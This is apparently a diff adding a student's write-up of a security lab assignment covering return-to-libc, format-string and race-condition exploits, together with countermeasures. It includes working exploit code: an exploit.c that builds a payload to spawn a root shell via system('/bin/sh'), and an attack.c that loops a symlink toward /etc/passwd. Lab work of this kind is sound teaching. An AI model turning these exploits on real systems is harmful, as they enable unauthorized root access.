@@ -650,11 +650,117 @@
 ## 4 Return-to-libc Attack
 
 ### 4.3 Exploiting the Vulnerability [4 Marks]
+
+* The result of `gdb` command
+
+  ![1586090127416](assets/1586090127416.png)
+
 ### 4.4 Putting the shell string in the memory [5 Marks]
+
+* Export the environment variable
+
+  ![1586093035188](assets/1586093035188.png)
+
+* Code
+
+  ```c
+  #include <stdio.h>
+  
+  int main(){
+  	char* shell = getenv("MYSHELL");
+  	if (shell) {
+  		printf("%x\n", (unsigned int)shell);
+  	}
+  	return 0;
+  }
+  ```
+
+* Result in the terminal
+
+  ![1586092589094](assets/1586092589094.png)
+
 ### 4.5 Exploiting the Vulnerability [6 Marks]
 
+*  The code for `exploit.c`
+
+  ```c
+  /* exploit.c */
+  
+  #include <stdlib.h>
+  #include <stdio.h>
+  #include <string.h>
+  
+  int main(int argc, char **argv)
+  {
+  	char buf[250];
+  	FILE *badfile;
+  
+  	badfile = fopen("./badfile", "w");
+  
+  	/* You need to decide the addresses and
+  	the values for X, Y, Z. The order of the following
+  	three statements does not imply the order of X, Y, Z.
+  	Actually, we intentionally scrambled the order. */
+  	*(long *) &buf[0x1e + 12] = 0xbffffe1c ; // "/bin/sh"
+  	*(long *) &buf[0x1e + 4] = 0xb7e42da0 ; // system()
+  	*(long *) &buf[0x1e + 8] = 0xb7e369d0 ; // exit()
+  
+  	fwrite(buf, sizeof(buf), 1, badfile);
+  	fclose(badfile);
+      return 0;
+  }
+  ```
+
+* Result:
+
+  ![1586167645494](assets/1586167645494.png)
+
+* How to decide the values for X, Y and Z
+
+  * According to the tutorial, we should consider the change between the epilogue of `vul_func()` and the prologue of `system()`. Assume `n` is the address of the ebp of `vul_func()`, we should store address of system, address of `exit`, and the argument of `system` at `n+4`, `n+8`, and `n+12` respectively.
+
+  * Firstly, we find the distance between `buffer` and `ebp`
+
+    ![1586166005743](assets/1586166005743.png)
+
+    * The distance is `0x1e=30` 
+
+  * Therefore, $X = 30+12=42， Y=30+4=34, Z=30+8=38$ 
+
+* If we comment the step to set up `exit` address
+
+  * Observation: The root shell can be launched, but segmentation fault will exist after exit from shell.
+
+    ![1586167767226](assets/1586167767226.png)
+
+  * Explanation: If we don’t set the return address of `system ` function, it will return to some random memory location after the `system` function has been finished
+
+* If we change the length of the filename
+
+  * Observation: The attack has been failed. The position of the buffer is not accessed accurately
+
+    ![1586167951747](assets/1586167951747.png)
+
+  * Explanation: Since we save the string in the environment variable, and the filename is also part of the environment. If we change the length of the filename, the memory used by the filename variable will be larger. As a consequence, the address of the `MYSHELL` variable will be changed.
+
 ### 4.6 Address Randomization [3 Marks]
+
+* Observation: I cannot get a shell. There will be segmentation fault. The address randomization do make the return-to-libc attack difficult.
+
+  ![1586168613316](assets/1586168613316.png)
+
+* Explanation: As shown in the following experiment, the address of the environment variable has been randomly allocated. 
+
+  ![1586169271716](assets/1586169271716.png)
+
 ### 4.7 Stack Guard Protection [3 Marks]
+
+* Observation: I cannot get a shell. Stack smashing will be detected. The Stack Guard
+  protection make the return-to-libc attack difficult.
+
+  ![1586169504927](assets/1586169504927.png)
+
+* Explanation: Stack guard provide integrity checking for the stack. The return-to-libc attack will change the return address and go through the canary, which will be detected by the stack guard.
 
 ----------------------
 
@@ -672,9 +778,13 @@
 
 * `secret[0]` as well as the heap address of `secret[1]`
 
+  * As shown below, the addresses are `0x804b008=134524936` and `0x804b00c= 134524940` respectively
+
   ![1584725404839](assets/1584725404839.png)
 
 * Find out the position of the integer number `int_input`
+
+  * We input the decimal value of heap address of `secret[1]`, and we find that it is the ninth `%x`
 
   ![1584726787733](assets/1584726787733.png)
 
@@ -684,15 +794,101 @@
 
 ### 5.3 Modify the secret[1] value [5 Marks]
 
+* Simply replace the `%s` by `%n`
+
 ![1584727008014](assets/1584727008014.png)
 
 ### 5.4 Modify the secret[1] value to a pre-determined value, i.e., 80 in decimal [5 Marks]
+
+* There are 8 `%` before the `%n`, and 80 characters in total, we set each `%` can print 10 characters (i.e. use `%9x`) 
 
 ![1584727164693](assets/1584727164693.png)
 
 -------------------
 
 ## 6 Race Condition Vulnerability
+
+### 6.3 Choosing Our Target [5 Marks]
+
+* I can log into the test account without typing a password. The root privilege is obtained. 
+
+![1586174894305](assets/1586174894305.png)
+
+### 6.4 Launching the Race Condition Attack [4 Marks]
+
+* Code of `attack.c`
+
+  ```c
+  #include <unistd.h>
+  
+  int main(){
+  	while(1){
+  		unlink("/tmp/XYZ");
+  		symlink("/home/seed/Desktop/CS4293/assignment/Experiment/assignment2/task6/myfile", "/tmp/XYZ");
+  		usleep(10000);
+  		unlink("/tmp/XYZ");
+  		symlink("/etc/passwd", "/tmp/XYZ");
+  		usleep(10000);
+  	}
+  	return 0;
+  }
+  ```
+
+* Result: Notice that we should run executable `attack` before the `attack.sh`
+
+  ![1586178552086](assets/1586178552086.png)
+
+  ![1586178325752](assets/1586178325752.png)
+
+  ![1586178385838](assets/1586178385838.png)
+
+### 6.5 Countermeasure: Applying the Principle of Least Privilege [4 Marks]
+
+* changed code for `vulp.c`
+
+  ```c
+  #include <stdio.h>
+  #include <unistd.h>
+  int main()
+  {
+  	char * fn = "/tmp/XYZ";
+  	char buffer[60];
+  	FILE *fp;
+  	/* get user input */
+  	seteuid(getuid());
+  	scanf("%50s", buffer );
+  	if(!access(fn, W_OK)){
+  		fp = fopen(fn, "a+");
+  		fwrite("\n", sizeof(char), 1, fp);
+  		fwrite(buffer, sizeof(char), strlen(buffer), fp);
+  		fclose(fp);
+  	}
+  	else printf("No permission \n");
+  }
+  
+  ```
+
+* Observation: Race condition attack does not work in five minutes. 
+
+  ![1586180802645](assets/1586180802645.png)
+
+* Explanation: Originally, when opening the file, the vulnerable program has the root privilege, which is more than what is needed by the task. By setting the effective user id to the real user id before opening the file, we can check whether the user do have the right to use this file.
+
+### 6.6 Countermeasure: Using Ubuntu’s Built-in Scheme [3 Marks]
+
+* Observation: The attack is failed and results in segmentation fault. 
+
+  ![1586181759534](assets/1586181759534.png)
+
+* How does this protection scheme work?
+
+  * This protection scheme makes sure that symbolic links inside a sticky world-writable can only be followed when the owner of the symlink matches either the follower or the directory owner. (The permission table is as following) Therefore, in this case, the `/tmp/XYZ` has follower and owner to be `root`, user cannot create symlink anymore. 
+
+  ![1586181941834](assets/1586181941834.png)
+
+* What are the limitations of this scheme?
+
+  * It is still vulnerable once the users can create symlink by using another setuid program (says by using buffer overflow)
 
 
 
